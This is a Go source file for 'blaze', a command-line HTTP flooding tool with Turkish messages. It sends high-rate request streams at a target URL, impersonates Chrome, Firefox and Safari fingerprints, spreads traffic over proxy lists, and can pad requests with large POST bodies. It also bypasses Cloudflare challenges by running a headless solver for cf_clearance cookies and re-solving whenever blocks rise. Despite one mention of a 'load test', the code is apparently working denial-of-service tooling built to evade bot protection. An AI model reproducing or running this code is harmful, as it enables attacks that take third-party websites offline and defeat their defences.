package main

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"os/signal"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	gofire "github.com/JSInvasor/Gohttp-clientfingerprintemulateandfastest"
)

// ANSI colors
const (
	white = "\033[37m"
	gray  = "\033[38;5;245m"
	red   = "\033[31m"
	reset = "\033[0m"
)

func main() {
	if len(os.Args) < 4 {
		fmt.Println("kullanim: blaze <url> <sure_sn> <thread> [stream] [method] [proxy|proxy_dosya] [--solve] [--body=BOYUT]")
		fmt.Println()
		fmt.Println("ornek:    ./blaze https://hedef.com 60 64 32")
		fmt.Println("ornek:    ./blaze https://hedef.com 60 40 40 GET --solve")
		fmt.Println("ornek:    ./blaze https://hedef.com 60 40 40 POST --body=16k   (origin'e buyuk paket)")
		os.Exit(1)
	}

	targetURL := os.Args[1]
	if !strings.HasPrefix(targetURL, "http://") && !strings.HasPrefix(targetURL, "https://") {
		targetURL = "https://" + targetURL
	}

	durSec := mustInt(os.Args[2], "sure")
	threads := mustInt(os.Args[3], "thread")

	streams := 32
	method := "GET"
	proxyArg := ""
	solve := false
	bodySize := 0

	posArgs := []string{}
	for _, arg := range os.Args[4:] {
		switch {
		case arg == "--solve":
			solve = true
		case strings.HasPrefix(arg, "--body="):
			bodySize = mustBytes(strings.TrimPrefix(arg, "--body="))
		default:
			posArgs = append(posArgs, arg)
		}
	}
	if len(posArgs) >= 1 {
		streams = mustInt(posArgs[0], "stream")
	}
	if len(posArgs) >= 2 {
		method = strings.ToUpper(posArgs[1])
	}
	if len(posArgs) >= 3 {
		proxyArg = posArgs[2]
	}

	// A body only ships on methods that carry one. If the user asked for a
	// body but left the method at GET, promote to POST so the bytes actually
	// reach the origin.
	if bodySize > 0 && method == "GET" {
		method = "POST"
	}

	var solvedCookies string
	var solvedUA string
	if solve {
		var err error
		solvedCookies, solvedUA, err = solveCFChallenge(targetURL)
		if err != nil {
			fmt.Fprintf(os.Stderr, "%shata: challenge cozulemedi: %v%s\n", red, err, reset)
			os.Exit(1)
		}
	}

	run(targetURL, durSec, threads, streams, method, proxyArg, solvedCookies, solvedUA, solve, bodySize)
}

type solverResult struct {
	Status    string `json:"status"`
	URL       string `json:"url"`
	UserAgent string `json:"user_agent"`
	Cookies   string `json:"cookies"`
	Error     string `json:"error"`
}

func solveCFChallenge(targetURL string) (cookies string, userAgent string, err error) {
	fmt.Printf("cloudflare challenge cozuluyor...\n")

	solverPath := findSolver()
	if solverPath == "" {
		return "", "", fmt.Errorf("solver/index.js bulunamadi")
	}
	if _, errStat := os.Stat("solver/node_modules"); os.IsNotExist(errStat) {
		return "", "", fmt.Errorf("solver/node_modules bulunamadi")
	}

	// 90s ceiling: human navigation + challenge solve can legitimately take
	// 30-60s on slower targets, especially when CF re-issues the challenge.
	ctx, cancel := context.WithTimeout(context.Background(), 90*time.Second)
	defer cancel()

	cmd := exec.CommandContext(ctx, "node", solverPath, targetURL, "75")
	cmd.Stderr = os.Stderr
	// Put node + every chromium child in their own process group so we can
	// kill the WHOLE tree on timeout. Without Setpgid, exec.CommandContext
	// only kills the immediate node process - chromium children survive as
	// orphans and keep eating CPU/RAM.
	cmd.SysProcAttr = &syscall.SysProcAttr{Setpgid: true}
	// On context cancel, send SIGKILL to the entire process group (-pid).
	cmd.Cancel = func() error {
		if cmd.Process == nil {
			return nil
		}
		return syscall.Kill(-cmd.Process.Pid, syscall.SIGKILL)
	}
	cmd.WaitDelay = 5 * time.Second // grace window for graceful close after Cancel
	output, errCmd := cmd.Output()
	if errCmd != nil {
		return "", "", fmt.Errorf("solver calistirilamadi: %w", errCmd)
	}

	var result solverResult
	if errJSON := json.Unmarshal(output, &result); errJSON != nil {
		return "", "", fmt.Errorf("solver ciktisi okunamadi: %w", errJSON)
	}

	// Strict status check. Treating any non-empty cookie jar as success is a
	// trap: the no_clearance case still harvests __cf_bm, so a full UAM target
	// that never issued cf_clearance would print "cozuldu!" and then 403 the
	// whole run. Only status=="ok" (cf_clearance present) is a real solve.
	switch result.Status {
	case "ok":
		// real cf_clearance — fall through
	case "no_clearance":
		return "", "", fmt.Errorf("cf_clearance alinamadi (challenge gecilemedi — IP reputation / UAM). status=no_clearance")
	case "error":
		return "", "", fmt.Errorf("%s", result.Error)
	default:
		return "", "", fmt.Errorf("beklenmeyen solver durumu: %s", result.Status)
	}
	if result.Cookies == "" {
		return "", "", fmt.Errorf("cookie bos (status: %s)", result.Status)
	}

	fmt.Printf("%schallenge cozuldu!%s\n", white, reset)
	return result.Cookies, result.UserAgent, nil
}

func findSolver() string {
	for _, p := range []string{"solver/index.js", "./solver/index.js"} {
		if _, err := os.Stat(p); err == nil {
			return p
		}
	}
	return ""
}

type clientGroup struct {
	name      string
	tag       string // Ch, FF, SF
	clients   []*gofire.Client
	pipelines []*gofire.Pipeline
	templates []*http.Request
}

func (cg *clientGroup) Close() {
	for _, p := range cg.pipelines {
		p.Close()
	}
	for _, c := range cg.clients {
		c.Close()
	}
}

func (cg *clientGroup) ActiveConnections() int64 {
	var total int64
	for _, c := range cg.clients {
		total += c.ActiveConnections()
	}
	return total
}

func (cg *clientGroup) updateCookies(newCookies string) {
	for i, tmpl := range cg.templates {
		// Clone the template and set new cookie - atomic swap, no race.
		newTmpl := tmpl.Clone(tmpl.Context())
		newTmpl.Header.Set("Cookie", newCookies)
		cg.templates[i] = newTmpl
		cg.pipelines[i].SetTemplate(newTmpl)
	}
}

// browserLabel maps tag to full display name
var browserLabel = map[string]string{
	"Ch": "Chrome 147",
	"FF": "Firefox 150",
	"SF": "Safari iOS 18",
}

// classifyErr turns a raw error string into a short, actionable reason.
// Handshake failures in particular get broken down by *why* they failed —
// the generic "tls handshake failed" hid whether the cause was a slow proxy
// (timeout), a proxy dropping the tunnel (reset/EOF), a MITM proxy (cert),
// or a non-tunneling proxy (CONNECT failed).
func classifyErr(errMsg string) string {
	lc := strings.ToLower(errMsg)
	switch {
	case strings.Contains(lc, "connect failed") || strings.Contains(lc, "connect "):
		// Proxy refused/failed the CONNECT — show the proxy's status line.
		return trimErr(errMsg, "proxy CONNECT failed: ")
	case strings.Contains(lc, "i/o timeout") || strings.Contains(lc, "deadline exceeded") || strings.Contains(lc, "timeout"):
		if strings.Contains(lc, "handshake") || strings.Contains(lc, "server hello") {
			return "tls handshake timeout (slow/dead proxy)"
		}
		return "timeout (slow/dead proxy)"
	case strings.Contains(lc, "certificate") || strings.Contains(lc, "x509"):
		return "tls cert error (MITM/transparent proxy?)"
	case strings.Contains(lc, "eof") || strings.Contains(lc, "reset") || strings.Contains(lc, "broken pipe"):
		return "tls handshake: tunnel dropped by proxy"
	case strings.Contains(lc, "server hello") || strings.Contains(lc, "handshake"):
		// Some other handshake-stage failure — keep the real detail.
		return trimErr(errMsg, "tls handshake: ")
	case strings.Contains(lc, "connection refused"):
		return "connection refused"
	case strings.Contains(lc, "no route to host"):
		return "no route to host (dead proxy)"
	default:
		return trimErr(errMsg, "")
	}
}

func trimErr(errMsg, prefix string) string {
	if len(errMsg) > 200 {
		errMsg = errMsg[:200] + "..."
	}
	return prefix + errMsg
}

// formatTestResult returns the impersonate line for a browser test.
func formatTestResult(tag string, statusCode int, err error) string {
	label := browserLabel[tag]
	if label == "" {
		label = tag
	}

	if err != nil {
		return fmt.Sprintf("%sImpersonate %s %s>%s %s%s%s", white, label, gray, reset, red, classifyErr(err.Error()), reset)
	}
	return fmt.Sprintf("%sImpersonate %s %s>%s %s%d%s", white, label, gray, reset, white, statusCode, reset)
}

func run(targetURL string, durSec, threads, streams int, method, proxyArg, solvedCookies, solvedUA string, solveEnabled bool, bodySize int) {
	runtime.GOMAXPROCS(runtime.NumCPU())

	// Pre-build the POST body once. The same buffer is shared (read-only) by
	// every client's template via GetBody, so there's no per-request alloc.
	var bodyBytes []byte
	if bodySize > 0 {
		bodyBytes = make([]byte, bodySize)
		// urlencoded form shape: "f=AAAA..." so Content-Type matches a real
		// browser form POST. Guard the prefix bytes for tiny sizes.
		for i := range bodyBytes {
			bodyBytes[i] = 'A'
		}
		if len(bodyBytes) >= 2 {
			bodyBytes[0] = 'f'
			bodyBytes[1] = '='
		}
		fmt.Printf("%sbody modu: %s %d byte/request (origin'e buyuk paket)%s\n",
			gray, method, bodySize, reset)
	}

	// No artificial cap — use thread count directly so the VPS decides the ceiling.
	totalTargetClients := threads
	if totalTargetClients < 1 {
		totalTargetClients = 1
	}

	// Scale connection pools with workload. 0 = unlimited active connections.
	idlePerHost := threads * streams
	if idlePerHost < 256 {
		idlePerHost = 256
	}

	usingProxy := proxyArg != ""

	reqTimeout := 10 * time.Second
	dialTO := 8 * time.Second
	tlsTO := 8 * time.Second
	if usingProxy {
		reqTimeout = 30 * time.Second
		dialTO = 15 * time.Second
		tlsTO = 15 * time.Second
	}

	baseOpts := []gofire.Option{
		gofire.WithTimeout(reqTimeout),
		gofire.WithTLSHandshakeTimeout(tlsTO),
		gofire.WithDialTimeout(dialTO),
		gofire.WithMaxIdleConnsPerHost(idlePerHost),
		gofire.WithMaxIdleConns(0),
		gofire.WithMaxConnsPerHost(0),
		gofire.WithDNSCacheTTL(30 * time.Minute),
		gofire.WithIdleConnTimeout(120 * time.Second),
		gofire.WithMaxRedirects(3),
		gofire.WithWriteBufferSize(128 * 1024),
		gofire.WithReadBufferSize(128 * 1024),
	}

	browserReferers := map[string]string{
		"safari":  "https://www.google.com/search?client=safari&channel=iphone_bm",
		"chrome":  "https://www.google.com/",
		"firefox": "https://duckduckgo.com/",
	}

	// Proxy plumbing has two modes:
	//
	//   single proxy URL on cmdline -> WithProxy on every client (existing)
	//   proxy file                  -> one client per proxy, pinned via
	//                                  WithProxy(<that-proxy>). The shared
	//                                  rotator approach only rotates at dial
	//                                  time, so H2 connection reuse meant a
	//                                  300-entry list often only saw ~5
	//                                  proxies actively in use. Per-proxy
	//                                  clients guarantee every entry runs
	//                                  its own connection pool.
	var proxyURLs []string
	if usingProxy {
		if isProxyFile(proxyArg) {
			pr, err := gofire.NewProxyRotatorFromFile(proxyArg)
			if err != nil {
				fmt.Fprintf(os.Stderr, "%shata: proxy dosyasi yuklenemedi: %v%s\n", red, err, reset)
				os.Exit(1)
			}
			proxyURLs = pr.ProxyURLs()
			if len(proxyURLs) == 0 {
				fmt.Fprintf(os.Stderr, "%shata: proxy dosyasi bos%s\n", red, reset)
				os.Exit(1)
			}
		} else {
			baseOpts = append(baseOpts, gofire.WithProxy(proxyArg))
		}
	}

	var parsedCookies []*http.Cookie
	if solvedCookies != "" {
		parsedCookies = parseCookieHeader(solvedCookies)
	}

	type browserSpec struct {
		name    string
		tag     string // Ch, FF, SF
		profile gofire.BrowserProfile
		clients int
	}

	var browsers []browserSpec

	// When a proxy file is in use, the *number of proxies* dictates client
	// count (one client per proxy). Otherwise fall back to the user-supplied
	// thread count.
	clientBudget := totalTargetClients
	if len(proxyURLs) > 0 {
		clientBudget = len(proxyURLs)
	}

	if solvedCookies != "" {
		browsers = []browserSpec{
			{"chrome", "Ch", gofire.Chrome148, clientBudget},
		}
		if solvedUA != "" {
			baseOpts = append(baseOpts, gofire.WithUserAgent(solvedUA))
		}
	} else {
		safariClients := clientBudget * 4 / 10
		chromeClients := clientBudget * 3 / 10
		firefoxClients := clientBudget - safariClients - chromeClients
		if safariClients < 2 {
			safariClients = 2
		}
		if chromeClients < 1 {
			chromeClients = 1
		}
		if firefoxClients < 1 {
			firefoxClients = 1
		}
		browsers = []browserSpec{
			{"firefox", "FF", gofire.Firefox151, firefoxClients},
			{"chrome", "Ch", gofire.Chrome148, chromeClients},
			{"safari", "SF", gofire.SafariIOS18, safariClients},
		}
	}

	groups := make([]*clientGroup, len(browsers))

	totalClients := 0
	for _, bs := range browsers {
		totalClients += bs.clients
	}
	workersPerClient := (threads * streams) / totalClients
	if workersPerClient < 1 {
		workersPerClient = 1
	}

	// Walk the proxy list with a global cursor so each client across all
	// browser groups gets a distinct proxy. With clientBudget == len(proxyURLs)
	// the assignment is exactly 1:1.
	proxyIdx := 0

	for bi, bs := range browsers {
		cg := &clientGroup{name: bs.name, tag: bs.tag}
		opts := append(baseOpts, gofire.WithReferer(browserReferers[bs.name]))

		for i := 0; i < bs.clients; i++ {
			clientOpts := opts
			if len(proxyURLs) > 0 {
				clientOpts = append(clientOpts, gofire.WithProxy(proxyURLs[proxyIdx%len(proxyURLs)]))
				proxyIdx++
			}
			c, err := gofire.Emulate(bs.profile, clientOpts...)
			if err != nil {
				fmt.Fprintf(os.Stderr, "%shata: %s client olusturulamadi: %v%s\n", red, bs.name, err, reset)
				os.Exit(1)
			}
			if len(parsedCookies) > 0 {
				_ = c.SetCookies(targetURL, parsedCookies)
			}
			tmpl, err := c.PrepareRequest(method, targetURL)
			if err != nil {
				fmt.Fprintf(os.Stderr, "%shata: template olusturulamadi: %v%s\n", red, err, reset)
				os.Exit(1)
			}
			if solvedCookies != "" {
				tmpl.Header.Set("Cookie", solvedCookies)
			}
			if bodyBytes != nil {
				attachBody(tmpl, bodyBytes, targetURL)
			}
			p := c.NewPipeline(workersPerClient)
			p.SetTemplate(tmpl)
			cg.clients = append(cg.clients, c)
			cg.pipelines = append(cg.pipelines, p)
			cg.templates = append(cg.templates, tmpl)
		}
		groups[bi] = cg
	}
	defer func() {
		for _, cg := range groups {
			cg.Close()
		}
	}()

	// Test one client per browser. With a proxy file in use this only samples
	// len(groups) of N proxies (one per browser group), so a single failed
	// test line doesn't mean the run will fail — it just means *that one*
	// proxy is bad. The load test continues with all clients regardless.
	if len(proxyURLs) > 0 {
		sampled := len(groups)
		rest := len(proxyURLs) - sampled
		if rest < 0 {
			rest = 0
		}
		fmt.Printf("%s%d proxy yuklendi (test asagidaki %d proxy'i ornekliyor — geri kalan %d proxy yine de calisir)%s\n",
			gray, len(proxyURLs), sampled, rest, reset)
	}
	testTimeout := 15 * time.Second
	if len(proxyURLs) > 0 {
		// Proxies often need 5-10s just for CONNECT; 30s gives a fair test.
		testTimeout = 30 * time.Second
	}
	for _, cg := range groups {
		testCtx, testCancel := context.WithTimeout(context.Background(), testTimeout)
		resp, testErr := cg.clients[0].DoWithContext(testCtx, method, targetURL, nil, nil)
		testCancel()
		if testErr != nil {
			fmt.Println(formatTestResult(cg.tag, 0, testErr))
		} else {
			fmt.Println(formatTestResult(cg.tag, resp.StatusCode(), nil))
			resp.Close()
		}
	}

	// Pre-warm silently
	warmCtx, warmCancel := context.WithTimeout(context.Background(), 10*time.Second)
	for _, cg := range groups {
		for _, c := range cg.clients {
			_ = c.PreConnect(warmCtx, targetURL, 4)
		}
	}
	warmCancel()

	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(durSec)*time.Second)
	defer cancel()

	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sigCh
		cancel()
	}()

	var (
		totalSent   atomic.Int64
		totalFailed atomic.Int64
		errMu       sync.Mutex
		recentErrs  []string
		errCountMap sync.Map
		recent403   atomic.Int64
		recentTotal atomic.Int64
		refreshing  atomic.Bool
	)

	onResult := func(resp *gofire.Response, err error, latency time.Duration) {
		totalSent.Add(1)
		if err != nil {
			totalFailed.Add(1)

			errStr := err.Error()
			if strings.Contains(errStr, "context canceled") {
				return
			}
			if len(errStr) > 200 {
				errStr = errStr[:200]
			}
			if _, loaded := errCountMap.LoadOrStore(errStr, &atomic.Int64{}); !loaded {
				errMu.Lock()
				if len(recentErrs) < 10 {
					recentErrs = append(recentErrs, errStr)
				}
				errMu.Unlock()
			}
			if val, ok := errCountMap.Load(errStr); ok {
				val.(*atomic.Int64).Add(1)
			}
		} else if resp != nil {
			recentTotal.Add(1)
			if resp.StatusCode() == 403 {
				recent403.Add(1)
			}
		}
	}

	for _, cg := range groups {
		for _, p := range cg.pipelines {
			p.OnResult = onResult
		}
	}

	var feedWg sync.WaitGroup
	feedPipeline := func(pipeline *gofire.Pipeline) {
		defer feedWg.Done()
		for {
			select {
			case <-ctx.Done():
				return
			default:
			}
			pipeline.FireAndForget(ctx, method, targetURL, nil, nil)
		}
	}

	// Scale feeders with worker count so the job channel never starves.
	feedersPerPipeline := workersPerClient / 8
	if feedersPerPipeline < 4 {
		feedersPerPipeline = 4
	}
	for _, cg := range groups {
		for _, p := range cg.pipelines {
			for i := 0; i < feedersPerPipeline; i++ {
				feedWg.Add(1)
				go feedPipeline(p)
			}
		}
	}

	// Auto-refresh: when 403 rate spikes, re-solve and rotate cookies.
	if solveEnabled {
		go func() {
			ticker := time.NewTicker(5 * time.Second)
			defer ticker.Stop()
			for {
				select {
				case <-ctx.Done():
					return
				case <-ticker.C:
					total := recentTotal.Load()
					count403 := recent403.Load()
					recentTotal.Store(0)
					recent403.Store(0)

					if total < 50 {
						continue
					}
					rate := float64(count403) / float64(total)
					if rate < 0.80 {
						continue
					}
					if !refreshing.CompareAndSwap(false, true) {
						continue
					}

					newCookies, _, errSolve := solveCFChallenge(targetURL)
					if errSolve != nil {
						refreshing.Store(false)
						continue
					}
					for _, cg := range groups {
						cg.updateCookies(newCookies)
					}
					refreshing.Store(false)
				}
			}
		}()
	}

	// RPS stats
	startTime := time.Now()
	go func() {
		ticker := time.NewTicker(1 * time.Second)
		defer ticker.Stop()
		var lastSent int64
		var peakRPS int64

		for {
			select {
			case <-ctx.Done():
				return
			case <-ticker.C:
				sent := totalSent.Load()
				elapsed := time.Since(startTime).Seconds()
				rps := sent - lastSent
				lastSent = sent
				if rps > peakRPS {
					peakRPS = rps
				}
				fmt.Printf("\r%ssent:%d rps:%d peak:%d %.0fs%s   ",
					white, sent, rps, peakRPS, elapsed, reset)
			}
		}
	}()

	feedWg.Wait()
	fmt.Println()

	// Only show errors on stop
	errMu.Lock()
	if len(recentErrs) > 0 {
		fmt.Println()
		for _, e := range recentErrs {
			count := int64(0)
			if val, ok := errCountMap.Load(e); ok {
				count = val.(*atomic.Int64).Load()
			}
			fmt.Printf("%s[%dx] %s%s\n", red, count, e, reset)
		}
	}
	errMu.Unlock()
}

func parseCookieHeader(raw string) []*http.Cookie {
	header := http.Header{}
	header.Add("Cookie", raw)
	req := http.Request{Header: header}
	return req.Cookies()
}

func isProxyFile(s string) bool {
	if strings.Contains(s, "://") {
		return false
	}
	if _, err := os.Stat(s); err == nil {
		return true
	}
	return strings.HasSuffix(s, ".txt") || strings.HasSuffix(s, ".list") || strings.HasSuffix(s, ".csv")
}

func mustInt(s, name string) int {
	v, err := strconv.Atoi(s)
	if err != nil || v <= 0 {
		fmt.Fprintf(os.Stderr, "%shata: gecersiz %s: %s%s\n", red, name, s, reset)
		os.Exit(1)
	}
	return v
}

// mustBytes parses a size like "512", "16k", "2m" into a byte count.
func mustBytes(s string) int {
	s = strings.TrimSpace(strings.ToLower(s))
	mult := 1
	switch {
	case strings.HasSuffix(s, "k"):
		mult = 1024
		s = strings.TrimSuffix(s, "k")
	case strings.HasSuffix(s, "m"):
		mult = 1024 * 1024
		s = strings.TrimSuffix(s, "m")
	}
	v, err := strconv.Atoi(s)
	if err != nil || v <= 0 {
		fmt.Fprintf(os.Stderr, "%shata: gecersiz --body boyutu: %s (ornek: --body=16k)%s\n", red, s, reset)
		os.Exit(1)
	}
	return v * mult
}

// attachBody wires a fixed body into a template request so FastDo can replay
// it. GetBody hands a fresh reader to every send (the shallow template copy
// shares one Body that would otherwise EOF after the first request). We also
// set the headers a real browser sends on a form POST — Content-Type,
// Content-Length (via ContentLength), and Origin — all of which already have
// ordered slots in the per-browser HeaderOrder, so the fingerprint stays valid.
func attachBody(tmpl *http.Request, body []byte, targetURL string) {
	tmpl.Body = io.NopCloser(bytes.NewReader(body))
	tmpl.ContentLength = int64(len(body))
	tmpl.GetBody = func() (io.ReadCloser, error) {
		return io.NopCloser(bytes.NewReader(body)), nil
	}
	tmpl.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	if u, err := url.Parse(targetURL); err == nil && u.Host != "" {
		tmpl.Header.Set("Origin", u.Scheme+"://"+u.Host)
	}
}
